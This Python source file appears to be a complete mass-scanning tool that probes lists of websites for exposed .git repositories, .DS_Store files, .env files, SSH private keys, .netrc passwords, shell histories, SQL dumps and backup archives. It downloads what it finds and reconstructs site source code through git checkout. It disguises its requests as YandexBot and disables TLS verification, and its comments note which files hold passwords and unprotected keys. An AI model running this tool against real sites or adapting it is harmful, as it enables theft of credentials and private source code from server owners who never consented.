__all__ = ('XAccessDumper',)

import asyncio
import collections
import dataclasses
import io
import re
import typing
from contextlib import asynccontextmanager
from pathlib import Path
from urllib.parse import unquote, urljoin, urlparse

import aiohttp
import aiohttp.client_exceptions
from aiohttp.typedefs import LooseHeaders
from ds_store import DSStore, buddy

from . import errors
from .logger import logger
from .utils import permutate_strings, read_struct
from .wrappers import ResponseWrapper

HTTP_OK = 200

GIT_DIR = '.git/'

CHECK_GIT_FILES = (
    'COMMIT_EDITMSG',
    'FETCH_HEAD',
    'HEAD',
    'ORIG_HEAD',
    'config',
    'description',
    'info/exclude',
    'logs/HEAD',
    'objects/info/packs',
    'packed-refs',
)

SHA1_RE = re.compile(r'\b[a-f\d]{40}\b')
REF_RE = re.compile(r'\brefs/\S+')

SHA1_OR_REF_RE = re.compile(
    '(?P<sha1>' + SHA1_RE.pattern + ')|(?P<ref>' + REF_RE.pattern + ')'
)

UNLOADABLE_EXTS = (
    '.asp',
    '.avi',
    '.cgi',
    '.css',
    '.eot',
    '.exe',
    '.gif',
    '.htm',
    '.html',
    '.jpe',
    '.jpeg',
    '.jpg',
    '.js',
    '.jsp',
    '.mp3',
    '.mp4',
    '.ogg',
    '.otf',
    '.php',
    '.php3',
    '.php4',
    '.php5',
    '.php7',
    '.phtml',
    '.pl',
    '.png',
    '.psd',
    '.shtml',
    '.svg',
    '.ttf',
    '.webp',
    '.woff',
    '.woff2',
)

HTML_EXTS = ('.htm', '.html')

EXTENSION_RE = re.compile(r'\.[a-z]{1,4}[0-9]?$', re.I)

DB_CONFIGS = tuple(
    permutate_strings(('', 'conf/', 'config/'), ('db', 'database'))
)

CHECK_FILES = (
    '.git/index',
    '.DS_Store',
    # dotfiles
    '.profile',
    '.zshenv',
    *permutate_strings(('.bash', '.zsh'), ('rc', '_history')),
    # хранятся пароли от сайтов
    '.netrc',
    # часто ключи ssh без пароля
    *permutate_strings(('.ssh/',), ('id_rsa', 'id_ed25519'), ('', '.pub')),
    # бекапы в корне сайта
    *permutate_strings(
        ('www', '{host}', 'docroot', 'htdocs', 'site', 'backup'),
        ('.zip', '.tar.gz', '.tgz', '.tar', '.gz'),
    ),
    # дампы в корне
    *permutate_strings(
        ('dump', 'database', 'db'),
        ('.sql',),
    ),
    # докер
    'Dockerfile',
    'docker-compose.yml',
    '.env',
    'prod.env',
    # конфиги
    *permutate_strings(DB_CONFIGS, ('.ini', '.conf', '.cfg')),
    # копии php файлов
    # .swp файлы создает vim, они содержат точку в начале имени
    *map(
        lambda s: re.sub(r'([^/]+\.swp)$', r'.\1', s),
        permutate_strings(
            ('index', 'wp-config', 'settings', *DB_CONFIGS),
            ('.php',),
            ('1', '~', '.bak', '.swp'),
        ),
    ),
    # Проверяем каталоги на листинг
    *permutate_strings(('dump', 'backup'), ('', 's'), ('/',)),
    # TODO: add more...
)


@dataclasses.dataclass
class XAccessDumper:
    _: dataclasses.KW_ONLY
    exclude_pattern: re.Pattern | str | None = None
    headers: LooseHeaders | None = None
    num_workers: int = 50
    output_directory: str | Path = 'output'
    override_existing: bool = False
    timeout: float = 15.0
    max_timeouts_per_domain: int = 10
    user_agent: str = (
        "Mozilla/5.0"
        " (compatible; YandexBot/3.0; +http://yandex.com/bots)"
        " AppleWebKit/537.36 (KHTML, like Gecko)"
        " Chrome/81.0.4044.268"
    )

    def __post_init__(self) -> None:
        if self.exclude_pattern and not isinstance(
            self.exclude_pattern, re.Pattern
        ):
            self.exclude_pattern = re.compile(self.exclude_pattern)
        if isinstance(self.output_directory, str):
            self.output_directory = Path(self.output_directory)
        if not isinstance(self.timeout, aiohttp.ClientTimeout):
            self.timeout = aiohttp.ClientTimeout(self.timeout)

    def normalize_url(self, url: str) -> str:
        if '://' not in url:
            url = f'http://{url}'
        if not url.endswith('/'):
            url += '/'
        return url

    async def run(self, urls: typing.Sequence[str]) -> None:
        queue = asyncio.Queue()
        normalized_urls = list(map(self.normalize_url, urls))
        url_hosts = {x: urlparse(x).netloc for x in normalized_urls}
        # чтобы домены чередовались при запросах
        for filename in CHECK_FILES:
            for url in normalized_urls:
                queue.put_nowait(url + filename.format(host=url_hosts[url]))

        # Посещенные ссылки
        seen_urls = set()
        blacklisted_domains = set()
        timeout_attempts = collections.Counter()

        # Запускаем задания в фоне
        workers = [
            asyncio.create_task(
                self.worker(
                    queue, seen_urls, blacklisted_domains, timeout_attempts
                )
            )
            for _ in range(self.num_workers)
        ]

        # Ждем пока очередь станет пустой
        await queue.join()

        # Останавливаем задания
        for _ in range(self.num_workers):
            await queue.put(None)

        for w in workers:
            await w

        for url in normalized_urls:
            git_path = self.url2localpath(url + GIT_DIR)
            if git_path.exists():
                await self.retrieve_source_code(git_path)

    async def worker(
        self,
        queue: asyncio.Queue,
        seen_urls: set[str],
        blacklisted_domains: set[str],
        timeout_attempts: collections.Counter,
    ) -> None:
        async with self.get_session() as session:
            while True:
                try:
                    url = await queue.get()
                    if url is None:
                        break
                    if url in seen_urls:
                        logger.debug("already seen %s", url)
                        continue
                    seen_urls.add(url)
                    if url.endswith('/'):
                        await self.parse_directory_listing(session, url, queue)
                        continue
                    # "https://example.org/Old%20Site/.git/index" -> "output/example.org/Old Site/.git/index"
                    file_path = self.url2localpath(url)
                    if self.exclude_pattern and self.exclude_pattern.search(
                        file_path.name
                    ):
                        logger.debug("exclude file: %s", file_path)
                        continue
                    if self.override_existing or not file_path.exists():
                        domain = urlparse(url).netloc
                        if domain in blacklisted_domains:
                            logger.warn("blacklisted: %s", domain)
                            continue
                        await self.download_file(session, url, file_path)
                        logger.info("downloaded: %s", url)
                        timeout_attempts[domain] = 0
                    else:
                        logger.debug("file exists: %s", file_path)
                    if file_path.name == '.DS_Store':
                        await self.parse_ds_store(
                            file_path, urljoin(url, '.'), queue
                        )
                    elif (pos := url.rfind(GIT_DIR)) != -1:
                        await self.parse_git_file(
                            file_path, url[: pos + len(GIT_DIR)], queue
                        )
                    elif file_path.name == '.gitignore':
                        await self.parse_gitignore(file_path, url, queue)
                except errors.Error as e:
                    logger.warn(e)
                    if isinstance(e, errors.TimeoutError):
                        domain = urlparse(url).netloc
                        timeout_attempts[domain] += 1
                        if (
                            timeout_attempts[domain]
                            >= self.max_timeouts_per_domain
                        ):
                            logger.warn(
                                "max timeouts per domain exceeded: %s", domain
                            )
                            blacklisted_domains.add(domain)
                except Exception as e:
                    logger.exception(e)
                finally:
                    queue.task_done()

    async def parse_directory_listing(
        self, session: aiohttp.ClientSession, url: str, queue: asyncio.Queue
    ) -> None:
        response: ResponseWrapper
        filenames = []
        async with self.fetch(session, url) as response:
            if response.content_type != 'text/html':
                raise errors.Error(f"response is not text/html: {url}")
            html = await response.text()
            if '<title>Index of /' not in html:
                raise errors.Error(f"response is not server listing: {url}")
            for filename in re.findall(r'<a href="([^"]+)', html):
                # <a href="?C=N;O=D">Name</a>
                # <a href="/">Parent Directory</a>
                if not filename.startswith('/') and '?' not in filename:
                    filenames.append(filename)
        # закрыли соединение
        for filename in filenames:
            if not self.is_allowed2download(filename):
                logger.debug("skip: %s", filename)
                continue
            # <a href="backup.zip">
            # <a href="plugins/">
            await queue.put(url + filename)

    async def parse_ds_store(
        self, file_path: Path, base_url: str, queue: asyncio.Queue
    ) -> None:
        with file_path.open('rb') as fp:
            try:
                # TODO: разобраться как определить тип файла
                # https://wiki.mozilla.org/DS_Store_File_Format
                filenames = set(
                    x.filename
                    for x in DSStore.open(fp)
                    if x.filename not in ('.', '..')
                )
            except buddy.BuddyError as e:
                file_path.unlink()
                raise errors.Error(f"invalid format: {file_path}") from e
        for filename in filenames:
            if not self.is_allowed2download(filename):
                logger.debug("skip: %s", filename)
                continue
            is_dir = not EXTENSION_RE.search(filename)
            # Если файл выглядит как каталог проверяем есть ли в нем .DS_Store
            await queue.put(
                base_url + filename + ['', '/.DS_Store'][is_dir],
            )
            # Проверяем на листинг
            if is_dir:
                await queue.put(base_url + filename + '/')

    async def parse_git_file(
        self,
        file_path: Path,
        git_url: str,
        queue: asyncio.Queue,
    ) -> None:
        if file_path.name == 'index':
            # https://git-scm.com/docs/index-format
            hashes = []
            filenames = []
            with file_path.open('rb') as fp:
                sig, ver, num_entries = read_struct(fp, '!4s2I')
                assert sig == b'DIRC', "invalid signature"
                assert ver in (2, 3, 4), "invalid version"
                assert num_entries > 0, "invalid number of entries"
                logger.debug("num entries: %d", num_entries)
                n = num_entries
                while n > 0:
                    entry_size = fp.tell()
                    fp.seek(40, io.SEEK_CUR)  # file attrs
                    # 20 байт - хеш, 2 байта - флаги
                    # имя файла может храниться в флагах, но не видел такого
                    sha1 = fp.read(22)[:-2].hex()
                    assert len(sha1) == 40, "invalid sha1"
                    hashes.append(sha1)
                    filename = b''
                    while (c := fp.read(1)) != b'\0':
                        assert c != b'', "unexpected end of index file"
                        filename += c
                    filename = filename.decode()
                    filenames.append(filename)
                    logger.debug("%s %s", sha1, filename)
                    entry_size -= fp.tell()
                    # Размер entry кратен 8 (добивается NULL-байтами)
                    fp.seek(entry_size % 8, io.SEEK_CUR)
                    # Есть еще extensions, но они нигде не используются
                    n -= 1
            for filename in CHECK_GIT_FILES:
                await queue.put(git_url + filename)
            for sha1 in hashes:
                await queue.put(git_url + self.get_obj_filename(sha1))
            base_url = git_url[: -len(GIT_DIR)]
            # Пробуем скачать файлы напрямую, если .git не получится
            # восстановить, то, возможно, повезет с db.ini
            dirnames = set()
            for filename in filenames:
                if self.is_allowed2download(filename):
                    await queue.put(base_url + filename)
                try:
                    dirname, _ = filename.rsplit('/', 2)
                    dirnames.add(dirname)
                except ValueError:
                    pass
            # просканим так же каталоги на листинг содержимого
            # Например, какой-нибудь backups с .gitkeep
            for dirname in dirnames:
                await queue.put(base_url + dirname + '/')

        elif file_path.name == 'packs':
            # Содержит строки вида "P <hex>.pack"
            contents = file_path.read_text()
            for sha1 in SHA1_RE.findall(contents):
                for ext in ('idx', 'pack'):
                    await queue.put(git_url + f'objects/pack/pack-{sha1}.{ext}')
        elif not re.fullmatch(
            r'(pack-)?[a-f\d]{38}(\.(idx|pack))?', file_path.name
        ):
            for match in SHA1_OR_REF_RE.finditer(file_path.read_text()):
                group = match.groupdict()
                if group['sha1']:
                    await queue.put(
                        git_url + self.get_obj_filename(group['sha1']),
                    )
                    continue
                for directory in ('', 'logs/'):
                    await queue.put(git_url + f"{directory}{group['ref']}")

    async def parse_gitignore(
        self, file_path: Path, download_url: str, queue: asyncio.Queue
    ) -> None:
        filenames = []
        with file_path.open('r') as fp:
            for filename in fp:
                filename = filename.split('#')[0].strip()
                if not filename:
                    continue
                # Паттерны вида: `*.py[co]`
                if any(c in filename for c in '*[]'):
                    logger.warning("can't recognize: %s", filename)
                    continue
                if filename.startswith('/'):
                    filename = filename[1:]
                # TODO: добавить больше кейсов
                if filename.rstrip('/') == '.vscode':
                    filenames.extend(
                        ['.vscode/settings.json', '.vscode/launch.json']
                    )
                else:
                    filenames.append(filename)
        for filename in filenames:
            if self.is_allowed2download(filename):
                await queue.put(urljoin(download_url, filename))

    async def retrieve_source_code(self, git_path: Path) -> None:
        cmd = (
            f"git --git-dir='{git_path}'"
            f" --work-tree='{git_path.parent}'"
            ' checkout -- .'
        )
        logger.debug("run: %r", cmd)
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.PIPE,
        )
        _, stderr = await proc.communicate()
        if proc.returncode == 0:
            logger.info("source retrieved: %s", git_path)
        else:
            logger.error(stderr.decode())
            # logger.error("can't retrieve source: %s", git_path)

    async def download_file(
        self,
        session: aiohttp.ClientSession,
        download_url: str,
        file_path: Path,
    ) -> None:
        response: ResponseWrapper
        async with self.fetch(session, download_url) as response:
            if (
                response.content_type == 'text/html'
                and not self.check_extension(download_url, HTML_EXTS)
            ):
                raise errors.Error(f"text/html: {download_url}")
            try:
                file_path.parent.mkdir(parents=True, exist_ok=True)
                with file_path.open('wb') as fp:
                    async for chunk in response.content.iter_chunked(8192):
                        fp.write(chunk)
            except Exception as e:
                if file_path.exists():
                    logger.debug("delete: %s", file_path)
                    file_path.unlink()
                raise e

    @asynccontextmanager
    async def fetch(
        self, session: aiohttp.ClientSession, url: str
    ) -> ResponseWrapper:
        try:
            async with session.get(url, allow_redirects=False) as response:
                if response.status != HTTP_OK:
                    raise errors.BadResponse(response)
                yield ResponseWrapper(response)
        except aiohttp.client_exceptions.ServerDisconnectedError as e:
            raise errors.Error(e.message) from e
        except asyncio.exceptions.TimeoutError as e:
            raise errors.TimeoutError() from e

    @asynccontextmanager
    async def get_session(self) -> typing.AsyncIterable[aiohttp.ClientSession]:
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(verify_ssl=False),
            headers=self.headers,
            timeout=self.timeout,
        ) as session:
            session.headers.setdefault('User-Agent', self.user_agent)
            yield session

    def get_obj_filename(self, sha1: str) -> str:
        return f'objects/{sha1[:2]}/{sha1[2:]}'

    def check_extension(
        self, file_or_url: str | Path, ext_or_exts: str | tuple[str, ...]
    ) -> bool:
        return str(file_or_url).lower().endswith(ext_or_exts)

    def is_allowed2download(self, file_or_url: str | Path) -> bool:
        return not self.check_extension(file_or_url, UNLOADABLE_EXTS)

    def url2localpath(self, download_url: str) -> Path:
        return self.output_directory.joinpath(
            unquote(download_url.split('://')[1])
        )
